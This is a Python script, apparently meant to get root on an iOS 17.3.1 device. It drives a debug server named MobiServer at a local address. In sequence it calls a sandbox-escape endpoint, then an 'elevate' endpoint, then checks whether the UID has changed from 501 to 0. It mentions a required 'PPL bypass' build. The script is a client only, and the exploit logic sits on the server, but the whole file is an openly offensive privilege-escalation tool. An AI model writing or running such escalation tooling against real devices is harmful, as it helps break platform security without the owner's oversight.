#!/usr/bin/env python3
"""
final_escalate.py

This script attempts to obtain root by invoking built-in escalation
endpoints exposed by the MobiServer (educational debug server).

Design goals and safety rules (implemented by this script):
- Do NOT use raw `kwrite` to modify UID/GID fields (explicitly forbidden).
- Only call existing server endpoints that implement escalation logic.
- Parse and report server responses; do not brute-force or scan memory.

Steps performed:
1. GET /api/v1/ds to ensure the server and data structures are reachable.
2. GET /api/v1/sbx?action=escape to check sandbox escape state.
3. GET /api/v1/elevate — primary escalation attempt (if endpoint exists).
   - Analyze JSON for `rc`, `error`, `method_used`.
4. GET /api/v1/ids to verify current UID.

If `/api/v1/elevate` does not exist, the script prints a clear message
indicating that an updated MobiServer binary is required (PPL bypass support).

All major steps are logged to the console. Comments explain each stage
in English for maintainability.
"""
import sys
import requests
from requests.exceptions import ConnectionError, Timeout, RequestException


BASE_URL = "http://192.168.1.5:8686"
REQ_TIMEOUT = 5


def log(msg):
    print(msg)


def api_get(path, params=None):
    """Perform a GET request to the debug server and return parsed JSON

    Raises ConnectionError/Timeout to the caller for higher-level handling.
    """
    url = BASE_URL.rstrip('/') + path
    r = requests.get(url, params=params, timeout=REQ_TIMEOUT)
    # let HTTP errors raise to be handled by caller
    r.raise_for_status()
    try:
        return r.json()
    except ValueError:
        return r.content


def parse_address(value):
    """Helper to coerce common UID/addr formats into an int."""
    if isinstance(value, int):
        return value
    if isinstance(value, str):
        try:
            return int(value, 0)
        except ValueError:
            pass
    # If it's a dict/list, try to extract a sensible field
    if isinstance(value, dict):
        for k in ("uid", "euid", "ruid", "value", "addr"):
            if k in value:
                return parse_address(value[k])
    if isinstance(value, (list, tuple)) and value:
        return parse_address(value[0])
    raise ValueError("Unable to parse integer value from response")


def main():
    # Step 1: check /api/v1/ds
    log("Step 1: Querying /api/v1/ds to check server readiness...")
    try:
        ds = api_get('/api/v1/ds')
    except (ConnectionError, Timeout):
        print("Отладочный сервер не отвечает. Требуется перезагрузка устройства или сервиса.")
        sys.exit(1)
    except RequestException as e:
        print(f"HTTP error querying /api/v1/ds: {e}")
        sys.exit(1)

    log("/api/v1/ds OK")

    # Step 2: check sandbox escape endpoint
    log("Step 2: Checking sandbox state via /api/v1/sbx?action=escape...")
    try:
        sbx = api_get('/api/v1/sbx', params={'action': 'escape'})
        log(f"Sandbox endpoint returned: {sbx}")
    except RequestException as e:
        # Non-fatal: continue, but log the condition
        log(f"Sandbox check failed or endpoint missing: {e}")

    # Step 3: attempt to call /api/v1/elevate
    log("Step 3: Attempting built-in elevation via /api/v1/elevate...")
    try:
        elevate_resp = api_get('/api/v1/elevate')
    except RequestException as e:
        # If the endpoint is missing (404) or otherwise unavailable, report
        # that automatic escalation is not supported by this MobiServer build.
        # We check the exception message/status to provide clearer output.
        msg = str(e)
        if '404' in msg or 'Not Found' in msg:
            print('Автоматическая эскалация невозможна. Требуется обновление бинарного файла MobiServer с поддержкой PPL bypass для iOS 17.3.1.')
            sys.exit(0)
        print(f"Error calling /api/v1/elevate: {e}")
        sys.exit(1)

    # Analyze elevate response
    try:
        # Expecting JSON with rc, error, method_used
        if isinstance(elevate_resp, dict):
            rc = elevate_resp.get('rc')
            error = elevate_resp.get('error')
            method_used = elevate_resp.get('method_used') or elevate_resp.get('method')
        else:
            # If not JSON, coerce to string and show it
            print(f"Unexpected /api/v1/elevate response: {elevate_resp}")
            rc = None
            error = None
            method_used = None
    except Exception as e:
        print(f"Failed to parse /api/v1/elevate response: {e}")
        sys.exit(1)

    # Log details
    log(f"Elevate response: rc={rc}, error={error}, method_used={method_used}")

    # If rc exists and is non-zero, report the server-side error
    if rc is not None and int(rc) != 0:
        print(f"Elevation attempt failed. rc={rc}, error={error}")
        # Do not proceed to assume success
    else:
        log("Elevation endpoint returned success-ish rc (or no rc present). Proceeding to verification.")

    # Step 4: verify via /api/v1/ids
    log("Step 4: Verifying current UID via /api/v1/ids...")
    try:
        ids = api_get('/api/v1/ids')
    except (ConnectionError, Timeout):
        print("Отладочный сервер не отвечает. Невозможно выполнить верификацию.")
        sys.exit(1)
    except RequestException as e:
        print(f"HTTP error querying /api/v1/ids: {e}")
        sys.exit(1)

    # Try to extract UID from the ids response
    uid_current = None
    try:
        if isinstance(ids, dict):
            for k in ('uid', 'euid', 'ruid', 'current_uid'):
                if k in ids:
                    uid_current = parse_address(ids[k])
                    break
        if uid_current is None:
            uid_current = parse_address(ids)
    except Exception:
        # fallback: try to inspect values for an integer
        if isinstance(ids, dict):
            for v in ids.values():
                try:
                    uid_current = parse_address(v)
                    break
                except Exception:
                    continue

    # Final reporting per instructions
    if uid_current == 0:
        print("SUCCESS: UID is 0 — root obtained.")
    elif uid_current == 501:
        print("UID remains 501 (mobile). Built-in method did not succeed or requires process restart.")
    else:
        print(f"UID after elevation attempt: {uid_current} (expected 0).")


if __name__ == '__main__':
    main()
